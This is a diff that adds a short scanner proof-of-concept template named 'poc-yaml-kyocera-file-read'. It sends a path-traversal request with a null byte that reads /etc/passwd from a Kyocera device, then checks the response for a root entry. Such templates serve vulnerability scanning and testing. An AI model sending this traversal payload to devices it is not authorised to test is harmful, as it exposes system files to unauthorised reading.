@@ -1,0 +1,18 @@
+name: poc-yaml-kyocera-file-read
+manual: true
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /js/../../../../../../../../etc/passwd%00.jpg
+        expression: response.status == 200 && "^root:[^:]*:[0-9]*:[0-9]*:[^:]*".bmatches(response.body)
+expression: r1()
+detail:
+    author: xiaobaicai
+    links:
+        - https://www.exploit-db.com/exploits/50738
+    vulnerability:
+        id: CT-446218
+        level: medium
